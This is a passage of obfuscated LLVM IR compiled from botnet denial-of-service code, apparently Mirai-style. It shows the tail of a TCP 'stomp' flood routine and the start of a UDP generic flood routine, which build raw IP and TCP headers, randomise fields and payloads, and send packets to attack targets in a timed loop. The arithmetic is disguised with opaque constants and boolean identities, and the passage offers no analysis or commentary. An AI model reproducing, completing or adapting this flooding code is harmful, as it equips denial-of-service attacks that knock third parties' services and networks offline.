  %346 = xor i8 43, -1
  %347 = or i8 %344, %345
  %348 = or i8 43, %346
  %349 = xor i8 %347, -1
  %350 = and i8 %349, %348
  %351 = and i8 %343, 15
  %352 = and i8 %350, 64
  %353 = xor i8 %350, 64
  %354 = or i8 %352, %353
  %355 = or i8 %350, 64
  store i8 %354, i8* %342, align 4
  %356 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %357 = bitcast %struct.iphdr* %356 to i8*
  %358 = load i8, i8* %357, align 4
  %359 = xor i8 %358, -1
  %360 = xor i8 -16, -1
  %361 = xor i8 73, -1
  %362 = or i8 %359, %360
  %363 = or i8 73, %361
  %364 = xor i8 %362, -1
  %365 = and i8 %364, %363
  %366 = and i8 %358, -16
  %367 = xor i8 %365, -1
  %368 = xor i8 5, -1
  %369 = xor i8 0, -1
  %370 = and i8 %367, 0
  %371 = and i8 %365, %369
  %372 = and i8 %368, 0
  %373 = and i8 5, %369
  %374 = or i8 %370, %371
  %375 = or i8 %372, %373
  %376 = xor i8 %374, %375
  %377 = or i8 %367, %368
  %378 = xor i8 %377, -1
  %379 = or i8 0, %369
  %380 = and i8 %378, %379
  %381 = or i8 %376, %380
  %382 = or i8 %365, 5
  store i8 %381, i8* %357, align 4
  %383 = load i8, i8* %15, align 1
  %384 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 1
  store i8 %383, i8* %385, align 1
  %386 = load i32, i32* %26, align 4
  %387 = sext i32 %386 to i64
  %388 = sub i64 40, 4197884602302397173
  %389 = add i64 %388, %387
  %390 = add i64 %389, 4197884602302397173
  %391 = add i64 40, %387
  %392 = trunc i64 %390 to i16
  %393 = call zeroext i16 @htons(i16 zeroext %392) #7
  %394 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %394, i32 0, i32 2
  store i16 %393, i16* %395, align 2
  %396 = load i16, i16* %16, align 2
  %397 = call zeroext i16 @htons(i16 zeroext %396) #7
  %398 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 3
  store i16 %397, i16* %399, align 4
  %400 = load i8, i8* %17, align 1
  %401 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 5
  store i8 %400, i8* %402, align 4
  %403 = load i8, i8* %18, align 1
  %404 = icmp ne i8 %403, 0
  br i1 %404, label %405, label %409

; <label>:405:                                    ; preds = %276
  %406 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %407 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 4
  store i16 %406, i16* %408, align 2
  br label %409

; <label>:409:                                    ; preds = %405, %276
  %410 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 6
  store i8 6, i8* %411, align 1
  %412 = load i32, i32* @LOCAL_ADDR, align 4
  %413 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 8
  store i32 %412, i32* %414, align 4
  %415 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %416 = load i32, i32* %11, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %418, i32 0, i32 0
  %420 = load i32, i32* %419, align 4
  %421 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 9
  store i32 %420, i32* %422, align 4
  %423 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %424 = load i32, i32* %11, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %423, i64 %425
  %427 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %426, i32 0, i32 3
  %428 = load i16, i16* %427, align 4
  %429 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %430 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %429, i32 0, i32 0
  store i16 %428, i16* %430, align 4
  %431 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %432 = load i32, i32* %11, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %434, i32 0, i32 4
  %436 = load i16, i16* %435, align 2
  %437 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 1
  store i16 %436, i16* %438, align 2
  %439 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %440 = load i32, i32* %11, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %439, i64 %441
  %443 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %442, i32 0, i32 2
  %444 = load i32, i32* %443, align 4
  %445 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %446 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %445, i32 0, i32 2
  store i32 %444, i32* %446, align 4
  %447 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %448 = load i32, i32* %11, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %450, i32 0, i32 1
  %452 = load i32, i32* %451, align 4
  %453 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %454 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %453, i32 0, i32 3
  store i32 %452, i32* %454, align 4
  %455 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = xor i16 %457, -1
  %459 = xor i16 -241, -1
  %460 = xor i16 20217, -1
  %461 = or i16 %458, %459
  %462 = or i16 20217, %460
  %463 = xor i16 %461, -1
  %464 = and i16 %463, %462
  %465 = and i16 %457, -241
  %466 = and i16 %464, 128
  %467 = xor i16 %464, 128
  %468 = or i16 %466, %467
  %469 = or i16 %464, 128
  store i16 %468, i16* %456, align 4
  %470 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %471 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %470, i32 0, i32 4
  %472 = load i16, i16* %471, align 4
  %473 = xor i16 %472, -1
  %474 = xor i16 -257, -1
  %475 = xor i16 -15586, -1
  %476 = or i16 %473, %474
  %477 = or i16 -15586, %475
  %478 = xor i16 %476, -1
  %479 = and i16 %478, %477
  %480 = and i16 %472, -257
  %481 = xor i16 %479, -1
  %482 = xor i16 256, -1
  %483 = xor i16 20695, -1
  %484 = and i16 %481, 20695
  %485 = and i16 %479, %483
  %486 = and i16 %482, 20695
  %487 = and i16 256, %483
  %488 = or i16 %484, %485
  %489 = or i16 %486, %487
  %490 = xor i16 %488, %489
  %491 = or i16 %481, %482
  %492 = xor i16 %491, -1
  %493 = or i16 20695, %483
  %494 = and i16 %492, %493
  %495 = or i16 %490, %494
  %496 = or i16 %479, 256
  store i16 %495, i16* %471, align 4
  %497 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %498 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %497, i32 0, i32 4
  %499 = load i16, i16* %498, align 4
  %500 = xor i16 %499, -1
  %501 = xor i16 -4097, -1
  %502 = xor i16 -3968, -1
  %503 = or i16 %500, %501
  %504 = or i16 -3968, %502
  %505 = xor i16 %503, -1
  %506 = and i16 %505, %504
  %507 = and i16 %499, -4097
  %508 = and i16 %506, 4096
  %509 = xor i16 %506, 4096
  %510 = or i16 %508, %509
  %511 = or i16 %506, 4096
  store i16 %510, i16* %498, align 4
  %512 = call i32 @rand_next()
  %513 = xor i32 %512, -1
  %514 = xor i32 65535, -1
  %515 = xor i32 4387426, -1
  %516 = or i32 %513, %514
  %517 = or i32 4387426, %515
  %518 = xor i32 %516, -1
  %519 = and i32 %518, %517
  %520 = and i32 %512, 65535
  %521 = trunc i32 %519 to i16
  %522 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 5
  store i16 %521, i16* %523, align 2
  %524 = load i8, i8* %20, align 1
  %525 = sext i8 %524 to i16
  %526 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 4
  %528 = load i16, i16* %527, align 4
  %529 = xor i16 %525, -1
  %530 = xor i16 1, -1
  %531 = xor i16 -20378, -1
  %532 = or i16 %529, %530
  %533 = or i16 -20378, %531
  %534 = xor i16 %532, -1
  %535 = and i16 %534, %533
  %536 = and i16 %525, 1
  %537 = shl i16 %535, 13
  %538 = xor i16 %528, -1
  %539 = xor i16 -8193, -1
  %540 = xor i16 31139, -1
  %541 = or i16 %538, %539
  %542 = or i16 31139, %540
  %543 = xor i16 %541, -1
  %544 = and i16 %543, %542
  %545 = and i16 %528, -8193
  %546 = xor i16 %544, -1
  %547 = xor i16 %537, -1
  %548 = xor i16 6766, -1
  %549 = and i16 %546, 6766
  %550 = and i16 %544, %548
  %551 = and i16 %547, 6766
  %552 = and i16 %537, %548
  %553 = or i16 %549, %550
  %554 = or i16 %551, %552
  %555 = xor i16 %553, %554
  %556 = or i16 %546, %547
  %557 = xor i16 %556, -1
  %558 = or i16 6766, %548
  %559 = and i16 %557, %558
  %560 = or i16 %555, %559
  %561 = or i16 %544, %537
  store i16 %560, i16* %527, align 4
  %562 = load i8, i8* %21, align 1
  %563 = sext i8 %562 to i16
  %564 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %565 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %564, i32 0, i32 4
  %566 = load i16, i16* %565, align 4
  %567 = xor i16 1, -1
  %568 = xor i16 %563, %567
  %569 = and i16 %568, %563
  %570 = and i16 %563, 1
  %571 = shl i16 %569, 12
  %572 = xor i16 %566, -1
  %573 = xor i16 -4097, -1
  %574 = xor i16 -16972, -1
  %575 = or i16 %572, %573
  %576 = or i16 -16972, %574
  %577 = xor i16 %575, -1
  %578 = and i16 %577, %576
  %579 = and i16 %566, -4097
  %580 = and i16 %578, %571
  %581 = xor i16 %578, %571
  %582 = or i16 %580, %581
  %583 = or i16 %578, %571
  store i16 %582, i16* %565, align 4
  %584 = load i8, i8* %22, align 1
  %585 = sext i8 %584 to i16
  %586 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 4
  %588 = load i16, i16* %587, align 4
  %589 = xor i16 %585, -1
  %590 = xor i16 1, -1
  %591 = xor i16 23163, -1
  %592 = or i16 %589, %590
  %593 = or i16 23163, %591
  %594 = xor i16 %592, -1
  %595 = and i16 %594, %593
  %596 = and i16 %585, 1
  %597 = shl i16 %595, 11
  %598 = xor i16 %588, -1
  %599 = xor i16 -2049, -1
  %600 = xor i16 -4134, -1
  %601 = or i16 %598, %599
  %602 = or i16 -4134, %600
  %603 = xor i16 %601, -1
  %604 = and i16 %603, %602
  %605 = and i16 %588, -2049
  %606 = and i16 %604, %597
  %607 = xor i16 %604, %597
  %608 = or i16 %606, %607
  %609 = or i16 %604, %597
  store i16 %608, i16* %587, align 4
  %610 = load i8, i8* %23, align 1
  %611 = sext i8 %610 to i16
  %612 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 4
  %614 = load i16, i16* %613, align 4
  %615 = xor i16 %611, -1
  %616 = xor i16 1, -1
  %617 = xor i16 11378, -1
  %618 = or i16 %615, %616
  %619 = or i16 11378, %617
  %620 = xor i16 %618, -1
  %621 = and i16 %620, %619
  %622 = and i16 %611, 1
  %623 = shl i16 %621, 10
  %624 = xor i16 %614, -1
  %625 = xor i16 -1025, -1
  %626 = xor i16 9390, -1
  %627 = or i16 %624, %625
  %628 = or i16 9390, %626
  %629 = xor i16 %627, -1
  %630 = and i16 %629, %628
  %631 = and i16 %614, -1025
  %632 = xor i16 %630, -1
  %633 = xor i16 %623, -1
  %634 = xor i16 -13995, -1
  %635 = and i16 %632, -13995
  %636 = and i16 %630, %634
  %637 = and i16 %633, -13995
  %638 = and i16 %623, %634
  %639 = or i16 %635, %636
  %640 = or i16 %637, %638
  %641 = xor i16 %639, %640
  %642 = or i16 %632, %633
  %643 = xor i16 %642, -1
  %644 = or i16 -13995, %634
  %645 = and i16 %643, %644
  %646 = or i16 %641, %645
  %647 = or i16 %630, %623
  store i16 %646, i16* %613, align 4
  %648 = load i8, i8* %24, align 1
  %649 = sext i8 %648 to i16
  %650 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %651 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %650, i32 0, i32 4
  %652 = load i16, i16* %651, align 4
  %653 = xor i16 %649, -1
  %654 = xor i16 1, -1
  %655 = xor i16 3003, -1
  %656 = or i16 %653, %654
  %657 = or i16 3003, %655
  %658 = xor i16 %656, -1
  %659 = and i16 %658, %657
  %660 = and i16 %649, 1
  %661 = shl i16 %659, 9
  %662 = xor i16 %652, -1
  %663 = xor i16 -513, -1
  %664 = xor i16 13389, -1
  %665 = or i16 %662, %663
  %666 = or i16 13389, %664
  %667 = xor i16 %665, -1
  %668 = and i16 %667, %666
  %669 = and i16 %652, -513
  %670 = and i16 %668, %661
  %671 = xor i16 %668, %661
  %672 = or i16 %670, %671
  %673 = or i16 %668, %661
  store i16 %672, i16* %651, align 4
  %674 = load i8, i8* %25, align 1
  %675 = sext i8 %674 to i16
  %676 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %677 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %676, i32 0, i32 4
  %678 = load i16, i16* %677, align 4
  %679 = xor i16 1, -1
  %680 = xor i16 %675, %679
  %681 = and i16 %680, %675
  %682 = and i16 %675, 1
  %683 = shl i16 %681, 8
  %684 = xor i16 -257, -1
  %685 = xor i16 %678, %684
  %686 = and i16 %685, %678
  %687 = and i16 %678, -257
  %688 = xor i16 %686, -1
  %689 = xor i16 %683, -1
  %690 = xor i16 -17666, -1
  %691 = and i16 %688, -17666
  %692 = and i16 %686, %690
  %693 = and i16 %689, -17666
  %694 = and i16 %683, %690
  %695 = or i16 %691, %692
  %696 = or i16 %693, %694
  %697 = xor i16 %695, %696
  %698 = or i16 %688, %689
  %699 = xor i16 %698, -1
  %700 = or i16 -17666, %690
  %701 = and i16 %699, %700
  %702 = or i16 %697, %701
  %703 = or i16 %686, %683
  store i16 %702, i16* %677, align 4
  %704 = load i8*, i8** %41, align 8
  %705 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %704, i32 %705)
  %706 = load i8*, i8** %41, align 8
  %707 = load i32, i32* %26, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds i8, i8* %706, i64 %708
  store i8 0, i8* %709, align 1
  br label %758

; <label>:710:                                    ; preds = %265, %250
  %711 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %712 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %711, i32 0, i32 4
  %713 = load i16, i16* %712, align 4
  %714 = lshr i16 %713, 8
  %715 = xor i16 %714, -1
  %716 = xor i16 1, -1
  %717 = xor i16 8364, -1
  %718 = or i16 %715, %716
  %719 = or i16 8364, %717
  %720 = xor i16 %718, -1
  %721 = and i16 %720, %719
  %722 = and i16 %714, 1
  %723 = zext i16 %721 to i32
  %724 = icmp ne i32 %723, 0
  br i1 %724, label %740, label %725

; <label>:725:                                    ; preds = %710
  %726 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %727 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %726, i32 0, i32 4
  %728 = load i16, i16* %727, align 4
  %729 = lshr i16 %728, 10
  %730 = xor i16 %729, -1
  %731 = xor i16 1, -1
  %732 = xor i16 -7924, -1
  %733 = or i16 %730, %731
  %734 = or i16 -7924, %732
  %735 = xor i16 %733, -1
  %736 = and i16 %735, %734
  %737 = and i16 %729, 1
  %738 = zext i16 %736 to i32
  %739 = icmp ne i32 %738, 0
  br i1 %739, label %740, label %743

; <label>:740:                                    ; preds = %725, %710
  %741 = load i32, i32* %29, align 4
  %742 = call i32 @close(i32 %741)
  br label %131

; <label>:743:                                    ; preds = %725
  br label %744

; <label>:744:                                    ; preds = %743
  br label %745

; <label>:745:                                    ; preds = %744, %238
  br label %746

; <label>:746:                                    ; preds = %745, %234, %226
  %747 = call i64 @time(i64* null) #6
  %748 = load i64, i64* %34, align 8
  %749 = sub i64 %747, -657749968082461935
  %750 = sub i64 %749, %748
  %751 = add i64 %750, -657749968082461935
  %752 = sub nsw i64 %747, %748
  %753 = icmp sgt i64 %751, 10
  br i1 %753, label %754, label %757

; <label>:754:                                    ; preds = %746
  %755 = load i32, i32* %29, align 4
  %756 = call i32 @close(i32 %755)
  br label %131

; <label>:757:                                    ; preds = %746
  br label %214

; <label>:758:                                    ; preds = %409
  br label %759

; <label>:759:                                    ; preds = %758, %134
  %760 = load i32, i32* %11, align 4
  %761 = sub i32 0, 1
  %762 = sub i32 %760, %761
  %763 = add nsw i32 %760, 1
  store i32 %762, i32* %11, align 4
  br label %125

; <label>:764:                                    ; preds = %125
  br label %765

; <label>:765:                                    ; preds = %906, %764
  store i32 0, i32* %11, align 4
  br label %766

; <label>:766:                                    ; preds = %895, %765
  %767 = load i32, i32* %11, align 4
  %768 = load i8, i8* %7, align 1
  %769 = zext i8 %768 to i32
  %770 = icmp slt i32 %767, %769
  br i1 %770, label %771, label %900

; <label>:771:                                    ; preds = %766
  %772 = load i8**, i8*** %14, align 8
  %773 = load i32, i32* %11, align 4
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds i8*, i8** %772, i64 %774
  %776 = load i8*, i8** %775, align 8
  store i8* %776, i8** %42, align 8
  %777 = load i8*, i8** %42, align 8
  %778 = bitcast i8* %777 to %struct.iphdr*
  store %struct.iphdr* %778, %struct.iphdr** %43, align 8
  %779 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %780 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %779, i64 1
  %781 = bitcast %struct.iphdr* %780 to %struct.tcphdr*
  store %struct.tcphdr* %781, %struct.tcphdr** %44, align 8
  %782 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %783 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %782, i64 1
  %784 = bitcast %struct.tcphdr* %783 to i8*
  store i8* %784, i8** %45, align 8
  %785 = load i16, i16* %16, align 2
  %786 = zext i16 %785 to i32
  %787 = icmp eq i32 %786, 65535
  br i1 %787, label %788, label %801

; <label>:788:                                    ; preds = %771
  %789 = call i32 @rand_next()
  %790 = xor i32 %789, -1
  %791 = xor i32 65535, -1
  %792 = xor i32 -319856313, -1
  %793 = or i32 %790, %791
  %794 = or i32 -319856313, %792
  %795 = xor i32 %793, -1
  %796 = and i32 %795, %794
  %797 = and i32 %789, 65535
  %798 = trunc i32 %796 to i16
  %799 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %800 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %799, i32 0, i32 3
  store i16 %798, i16* %800, align 4
  br label %801

; <label>:801:                                    ; preds = %788, %771
  %802 = load i8, i8* %27, align 1
  %803 = icmp ne i8 %802, 0
  br i1 %803, label %804, label %811

; <label>:804:                                    ; preds = %801
  %805 = load i8*, i8** %45, align 8
  %806 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %805, i32 %806)
  %807 = load i8*, i8** %45, align 8
  %808 = load i32, i32* %26, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds i8, i8* %807, i64 %809
  store i8 0, i8* %810, align 1
  br label %811

; <label>:811:                                    ; preds = %804, %801
  %812 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %813 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %812, i32 0, i32 7
  store i16 0, i16* %813, align 2
  %814 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %815 = bitcast %struct.iphdr* %814 to i16*
  %816 = call zeroext i16 @checksum_generic(i16* %815, i32 20)
  %817 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %818 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %817, i32 0, i32 7
  store i16 %816, i16* %818, align 2
  %819 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %820 = load i32, i32* %11, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %819, i64 %821
  %823 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %822, i32 0, i32 1
  %824 = load i32, i32* %823, align 4
  %825 = sub i32 0, %824
  %826 = sub i32 0, 1
  %827 = add i32 %825, %826
  %828 = sub i32 0, %827
  %829 = add i32 %824, 1
  store i32 %828, i32* %823, align 4
  %830 = trunc i32 %824 to i16
  %831 = call zeroext i16 @htons(i16 zeroext %830) #7
  %832 = zext i16 %831 to i32
  %833 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %834 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %833, i32 0, i32 2
  store i32 %832, i32* %834, align 4
  %835 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %836 = load i32, i32* %11, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %835, i64 %837
  %839 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %838, i32 0, i32 2
  %840 = load i32, i32* %839, align 4
  %841 = trunc i32 %840 to i16
  %842 = call zeroext i16 @htons(i16 zeroext %841) #7
  %843 = zext i16 %842 to i32
  %844 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %845 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %844, i32 0, i32 3
  store i32 %843, i32* %845, align 4
  %846 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %847 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %846, i32 0, i32 6
  store i16 0, i16* %847, align 4
  %848 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %849 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %850 = bitcast %struct.tcphdr* %849 to i8*
  %851 = load i32, i32* %26, align 4
  %852 = sext i32 %851 to i64
  %853 = add i64 20, -5639991125985928561
  %854 = add i64 %853, %852
  %855 = sub i64 %854, -5639991125985928561
  %856 = add i64 20, %852
  %857 = trunc i64 %855 to i16
  %858 = call zeroext i16 @htons(i16 zeroext %857) #7
  %859 = load i32, i32* %26, align 4
  %860 = sext i32 %859 to i64
  %861 = sub i64 0, %860
  %862 = sub i64 20, %861
  %863 = add i64 20, %860
  %864 = trunc i64 %862 to i32
  %865 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %848, i8* %850, i16 zeroext %858, i32 %864)
  %866 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %867 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %866, i32 0, i32 6
  store i16 %865, i16* %867, align 4
  %868 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %869 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %868, i32 0, i32 1
  %870 = load i16, i16* %869, align 2
  %871 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %872 = load i32, i32* %11, align 4
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %871, i64 %873
  %875 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %874, i32 0, i32 0
  %876 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %875, i32 0, i32 1
  store i16 %870, i16* %876, align 2
  %877 = load i32, i32* %12, align 4
  %878 = load i8*, i8** %42, align 8
  %879 = load i32, i32* %26, align 4
  %880 = sext i32 %879 to i64
  %881 = add i64 40, -7440172260211118021
  %882 = add i64 %881, %880
  %883 = sub i64 %882, -7440172260211118021
  %884 = add i64 40, %880
  %885 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %886 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %887 = load i32, i32* %11, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %886, i64 %888
  %890 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %889, i32 0, i32 0
  %891 = bitcast %struct.sockaddr_in* %890 to %struct.sockaddr*
  store %struct.sockaddr* %891, %struct.sockaddr** %885, align 8
  %892 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %893 = load %struct.sockaddr*, %struct.sockaddr** %892, align 8
  %894 = call i64 @sendto(i32 %877, i8* %878, i64 %883, i32 16384, %struct.sockaddr* %893, i32 16)
  br label %895

; <label>:895:                                    ; preds = %811
  %896 = load i32, i32* %11, align 4
  %897 = sub i32 0, 1
  %898 = sub i32 %896, %897
  %899 = add nsw i32 %896, 1
  store i32 %898, i32* %11, align 4
  br label %766

; <label>:900:                                    ; preds = %766
  %901 = call i64 @time(i64* null) #6
  %902 = load i32, i32* %28, align 4
  %903 = sext i32 %902 to i64
  %904 = icmp sgt i64 %901, %903
  br i1 %904, label %905, label %906

; <label>:905:                                    ; preds = %900
  br label %907

; <label>:906:                                    ; preds = %900
  br label %765

; <label>:907:                                    ; preds = %905, %225, %121, %115
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #5

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
